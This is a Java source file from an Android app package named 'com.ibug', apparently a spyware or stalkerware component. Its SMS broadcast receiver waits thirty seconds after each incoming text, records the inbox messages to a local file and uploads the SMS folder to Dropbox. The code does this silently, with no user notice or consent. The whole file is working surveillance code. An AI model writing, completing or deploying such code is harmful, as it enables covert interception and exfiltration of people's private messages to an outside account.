package com.ibug.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import com.ibug.IAnnotations.*;
import com.ibug.misc.Dropbox;
import com.ibug.misc.SharedPreference;

import java.io.File;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static com.ibug.misc.Dropbox.isUploading;
import static com.ibug.misc.Utils.smsLocation;
import static com.ibug.misc.Utils.makeLocalSmsFile;

public class Inbox extends SmsTask {

    @Override
    public int getType() {
        return MESSAGE_TYPE_INBOX;
    }

    @Override
    public String writeToLocation() {
        Date date = new Date();
        return makeLocalSmsFile(context, "inbox", date.getTime());
    }

    @Override
    public String lastProcessedMessage(Context context) {
        return preference.get("LastInboxSms");
    }

    @Override
    public void lastMessageKey(String value) {
        preference.add("LastInboxSms", value);
    }

    @Constructor
    public Inbox(Context _context) {
        super(_context);
        context = _context;
        preference = new SharedPreference(context);
    }

    @InnerClass
    public static class _BroadcastReceiver extends BroadcastReceiver {

        private static int delay = 0;
        private static Context _context;
        private static boolean processing = false;
        private final String _action = "android.provider.Telephony.SMS_RECEIVED";

        @Override
        public void onReceive( Context ctx, Intent intent ) {
            if( intent.getAction().equals(_action) ) {
                _context = ctx.getApplicationContext();
                if(delay++ == 0) {
                    if(!processing) { // avoid multiple background process
                        Executors.newSingleThreadScheduledExecutor().schedule( ()-> {
                            runOnBackground(intent);
                            processing = false;
                            delay = 0;
                            new Handler(Looper.getMainLooper()).post(this::runOnUIThread);
                        }, 30, TimeUnit.SECONDS );
                    }
                }
            }
        }

        @UiTask
        private void runOnUIThread() {

        }

        @BackgroundTask
        private void runOnBackground(Intent intent) {
            processing = true;
            Inbox inbox = new Inbox(_context);
            inbox.execute(()-> {
                if (isUploading) return;
                String smsDir = smsLocation(_context);
                Dropbox dropbox = new Dropbox(_context);
                dropbox.upload(new File(smsDir));
            });
        }

    }

    private final Context context;
    private final int MESSAGE_TYPE_INBOX = 1;
    private final SharedPreference preference;

}
